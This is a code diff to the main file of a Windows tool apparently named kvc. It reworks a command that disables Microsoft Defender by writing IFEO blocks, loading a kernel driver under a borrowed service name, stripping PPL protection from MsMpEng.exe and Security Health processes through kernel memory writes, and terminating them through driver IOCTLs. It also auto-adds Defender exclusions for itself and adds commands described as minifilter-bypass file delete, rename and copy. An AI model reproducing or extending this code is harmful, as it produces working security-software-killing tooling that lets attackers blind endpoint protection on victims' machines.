@@ -11,7 +11,9 @@
 #include "ProcessListGUI.h"
 #include "ServiceManager.h"
 #include "HiveManager.h"
+#include "KillerSession.h"
 #include "ModuleManager.h"
+#include "ForceIOStager.h"
 #include <TlHelp32.h>
 #include <signal.h>
 #include <charconv>
@@ -38,6 +40,12 @@ extern "C" INT_PTR IoctlAddTrusted(const WCHAR* name);
 extern "C" INT_PTR IoctlRemoveTrusted(const WCHAR* name);
 extern "C" INT_PTR IoctlClearAll();
 
+// ForceIO command handlers (ForceIOOperations.cpp)
+int HandleForceIOLocks(int argc, wchar_t* argv[]);
+int HandleForceIODelete(int argc, wchar_t* argv[]);
+int HandleForceIORename(int argc, wchar_t* argv[]);
+int HandleForceIOCopy(int argc, wchar_t* argv[]);
+
 // Registry persistence from vg\config.asm (HKCU\Software\kvc\lock\*)
 extern "C" void ConfigSavePath(const WCHAR* path, DWORD flags);
 extern "C" void ConfigRemovePath(const WCHAR* path);
@@ -50,7 +58,6 @@ extern "C" void ConfigLoad();
 // ============================================================================
 
 std::unique_ptr<Controller> g_controller;
-volatile bool g_interrupted = false;
 
 // ============================================================================
 // HELPERS
@@ -134,6 +141,7 @@ void EnsureSelfDefenderExclusions() noexcept {
     }
 
     const auto ensureOne = [&](WmiDefenderClient::ExclusionType type, const wchar_t* typeName, const std::wstring& value) {
+        (void)typeName;
         if (wmi.HasExclusion(type, value)) {
             DEBUG(L"Defender auto-exclusion already exists: %s = %s", typeName, value.c_str());
             return;
@@ -525,17 +533,15 @@ int HandleSecEngineCommand(int argc, wchar_t* argv[]) {
 
     // disable:
     // Writes IFEO blocks for MsMpEng/SecurityHealthSystray/SecurityHealthService,
-    // then kernel-kills the running processes via kvckiller.sys (wsftprm service).
+    // then kernel-kills the running processes via kvckiller.sys (K7RKScan service).
     // No restart required.
     if (sub == L"disable") {
         // Step 1: write IFEO blocks (persistent)
         if (!DefenderManager::DisableSecurityEngine())
             return 1;
 
-        // Step 2: kernel-kill via kvckiller.sys (service: wsftprm, device: \\.\Warsaw_PM)
+        // Step 2: prepare kill driver, strip PPL, terminate targets
         PrivilegeUtils::EnablePrivilege(SE_LOAD_DRIVER_NAME);
-        g_controller->BeginDriverSession();
-        g_controller->EndDriverSession(true);
 
         const std::wstring killerPath = GetDriverStorePath() + L"\\kvckiller.sys";
         if (GetFileAttributesW(killerPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
@@ -543,92 +549,143 @@ int HandleSecEngineCommand(int argc, wchar_t* argv[]) {
             return 0;
         }
 
-        // Remove any stale wsftprm registration before creating a fresh one.
+        KillerSession session;
+        if (!session.Open(killerPath)) {
+            INFO(L"kvckiller driver failed to start - processes may still be running");
+            return 0;
+        }
+
+        // Resolve the target set once so protection changes and termination
+        // requests always refer to the same process instances.
+        static constexpr const wchar_t* targets[] = {
+            L"MsMpEng.exe", L"SecurityHealthSystray.exe", L"SecurityHealthService.exe"
+        };
+        std::vector<DWORD> targetPids;
         {
-            SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
-            if (hSCM) {
-                SC_HANDLE hOld = OpenServiceW(hSCM, L"wsftprm", DELETE);
-                if (hOld) { DeleteService(hOld); CloseServiceHandle(hOld); }
-                CloseServiceHandle(hSCM);
-            }
-        }
-
-        SC_HANDLE hKillerSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
-        SC_HANDLE hKillerSvc = nullptr;
-        bool killerLoaded = false;
-
-        if (hKillerSCM) {
-            hKillerSvc = CreateServiceW(hKillerSCM, L"wsftprm", L"wsftprm",
-                                        SERVICE_START | SERVICE_STOP | DELETE,
-                                        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
-                                        SERVICE_ERROR_NORMAL, killerPath.c_str(),
-                                        nullptr, nullptr, nullptr, nullptr, nullptr);
-            if (hKillerSvc && StartServiceW(hKillerSvc, 0, nullptr))
-                killerLoaded = true;
-        }
-
-        if (killerLoaded) {
-            HANDLE hDev = CreateFileW(L"\\\\.\\Warsaw_PM",
-                                      GENERIC_READ | GENERIC_WRITE, 0, nullptr,
-                                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-            if (hDev != INVALID_HANDLE_VALUE) {
-                static constexpr const wchar_t* killTargets[] = {
-                    L"MsMpEng.exe", L"SecurityHealthSystray.exe"
-                };
-                HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-                if (hSnap != INVALID_HANDLE_VALUE) {
-                    PROCESSENTRY32W pe{ sizeof(pe) };
-                    if (Process32FirstW(hSnap, &pe)) {
-                        do {
-                            for (const wchar_t* target : killTargets) {
-                                if (_wcsicmp(pe.szExeFile, target) == 0) {
-                                    std::vector<BYTE> buf(1036, 0);
-                                    *reinterpret_cast<DWORD*>(buf.data()) = pe.th32ProcessID;
-                                    DWORD ret = 0;
-                                    if (DeviceIoControl(hDev, 0x22201C,
-                                                        buf.data(), static_cast<DWORD>(buf.size()),
-                                                        nullptr, 0, &ret, nullptr))
-                                        SUCCESS(L"%s (PID %lu) terminated via kvckiller", target, pe.th32ProcessID);
-                                    else
-                                        INFO(L"IOCTL failed for %s (PID %lu): %lu", target, pe.th32ProcessID, GetLastError());
-                                }
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32W pe{ sizeof(pe) };
+                if (Process32FirstW(hSnap, &pe)) {
+                    do {
+                        for (const wchar_t* target : targets) {
+                            if (_wcsicmp(pe.szExeFile, target) == 0) {
+                                targetPids.push_back(pe.th32ProcessID);
+                                break;
                             }
-                        } while (Process32NextW(hSnap, &pe));
-                    }
-                    CloseHandle(hSnap);
+                        }
+                    } while (Process32NextW(hSnap, &pe));
                 }
-                CloseHandle(hDev);
-            } else {
-                INFO(L"Cannot open Warsaw_PM device: %lu", GetLastError());
+                CloseHandle(hSnap);
             }
-
-            // Stop SecurityHealthService (service-hosted, SCM stop suffices)
-            SC_HANDLE hSCM2 = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
-            if (hSCM2) {
-                SC_HANDLE hHealth = OpenServiceW(hSCM2, L"SecurityHealthService",
-                                                 SERVICE_STOP | SERVICE_QUERY_STATUS);
-                if (hHealth) {
-                    SERVICE_STATUS ss{};
-                    ControlService(hHealth, SERVICE_CONTROL_STOP, &ss);
-                    CloseServiceHandle(hHealth);
-                }
-                CloseServiceHandle(hSCM2);
-            }
-
-            // Cleanup: stop + delete wsftprm
-            if (hKillerSvc) {
-                SERVICE_STATUS ss{};
-                ControlService(hKillerSvc, SERVICE_CONTROL_STOP, &ss);
-                DeleteService(hKillerSvc);
-            }
-        } else {
-            INFO(L"kvckiller service failed to start - processes may still be running");
         }
 
-        if (hKillerSvc)  CloseServiceHandle(hKillerSvc);
-        if (hKillerSCM) CloseServiceHandle(hKillerSCM);
+        struct ProtectionBackup {
+            DWORD pid;
+            UCHAR protection;
+        };
+        std::vector<ProtectionBackup> protectionBackups;
 
-        return 0;
+        if (!g_controller->BeginDriverSession()) {
+            INFO(L"Cannot open the memory driver session - protected targets unchanged");
+            if (!session.Close()) {
+                INFO(L"Driver session cleanup reported an error");
+            }
+            return 2;
+        }
+
+        // Protection removal is transactional: remember the original byte and
+        // restore it if the process survives the termination phase.
+        for (DWORD pid : targetPids) {
+            const auto address = g_controller->GetProcessKernelAddress(pid);
+            if (!address) continue;
+
+            const auto protection =
+                g_controller->GetProcessProtection(address.value());
+            if (!protection || protection.value() == 0) continue;
+
+            const UCHAR originalProtection = protection.value();
+            if (!g_controller->SetProcessProtection(
+                    address.value(),
+                    0
+                )) {
+                ERROR(L"Failed to remove protection from PID %lu", pid);
+                continue;
+            }
+
+            const auto verified =
+                g_controller->GetProcessProtection(address.value());
+            if (!verified || verified.value() != 0) {
+                ERROR(L"Protection removal verification failed for PID %lu", pid);
+                g_controller->SetProcessProtection(
+                    address.value(),
+                    originalProtection
+                );
+                continue;
+            }
+
+            protectionBackups.push_back({ pid, originalProtection });
+            SUCCESS(L"Removed protection from PID %lu", pid);
+        }
+
+        // Kill via IOCTL and verify each original PID instance.
+        bool allGone = true;
+        for (DWORD pid : targetPids) {
+            const KillerSession::KillResult result = session.Kill(pid);
+            if (result.processGone) {
+                SUCCESS(L"PID %lu terminated via kvckiller", pid);
+                continue;
+            }
+
+            allGone = false;
+            if (!result.requestAccepted) {
+                INFO(L"kvckiller request for PID %lu failed (Win32 error %lu)",
+                     pid, result.transportError);
+            } else if (result.hasDriverStatus) {
+                INFO(L"kvckiller request for PID %lu returned NTSTATUS 0x%08lX",
+                     pid, result.driverStatus);
+            } else {
+                INFO(L"kvckiller accepted PID %lu without a status buffer", pid);
+            }
+        }
+
+        // Stop SecurityHealthService via SCM as well (belt and suspenders)
+        SC_HANDLE hSCM2 = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+        if (hSCM2) {
+            SC_HANDLE hHealth = OpenServiceW(hSCM2, L"SecurityHealthService",
+                                             SERVICE_STOP | SERVICE_QUERY_STATUS);
+            if (hHealth) {
+                SERVICE_STATUS ss{};
+                ControlService(hHealth, SERVICE_CONTROL_STOP, &ss);
+                CloseServiceHandle(hHealth);
+            }
+            CloseServiceHandle(hSCM2);
+        }
+
+        // Restore protection only for targets that survived the kill phase.
+        for (const ProtectionBackup& backup : protectionBackups) {
+            if (KillerSession::VerifyDead(backup.pid)) continue;
+
+            const auto address =
+                g_controller->GetProcessKernelAddress(backup.pid);
+            if (!address
+                || !g_controller->SetProcessProtection(
+                    address.value(),
+                    backup.protection
+                )) {
+                ERROR(L"Failed to restore protection for surviving PID %lu",
+                      backup.pid);
+                allGone = false;
+            }
+        }
+
+        g_controller->EndDriverSession(true);
+
+        bool cleanupOk = session.Close();
+        if (!cleanupOk) {
+            INFO(L"kvckiller cleanup reported an error");
+        }
+
+        return cleanupOk && allGone ? 0 : 2;
     }
 
     // enable:
@@ -860,8 +917,6 @@ int wmain(int argc, wchar_t* argv[])
 {
     signal(SIGINT, SignalHandler);
 
-    EnsureSelfDefenderExclusions();
-
     if (argc >= 2 && std::wstring_view(argv[1]) == L"--service") {
         return ServiceManager::RunAsService();
     }
@@ -870,6 +925,8 @@ int wmain(int argc, wchar_t* argv[])
         HelpSystem::PrintUsage(argv[0]);
         return argc < 2 ? 1 : 0;
     }
+
+    EnsureSelfDefenderExclusions();
 
     try {
         g_controller = std::make_unique<Controller>();
@@ -1134,6 +1191,12 @@ int wmain(int argc, wchar_t* argv[])
             if (sub == L"defrag") return hm.Defrag((argc >= 4) ? argv[3] : L"") ? 0 : 2;
             ERROR(L"Unknown registry subcommand: %s", sub.c_str()); return 1;
         }},
+
+        // --- ForceIO (minifilter-bypass file operations) ---
+        {L"locks",  HandleForceIOLocks},
+        {L"delete", HandleForceIODelete},
+        {L"rename", HandleForceIORename},
+        {L"copy",   HandleForceIOCopy},
 
         // --- Misc ---
         {L"watermark", [](int argc, wchar_t** argv) {
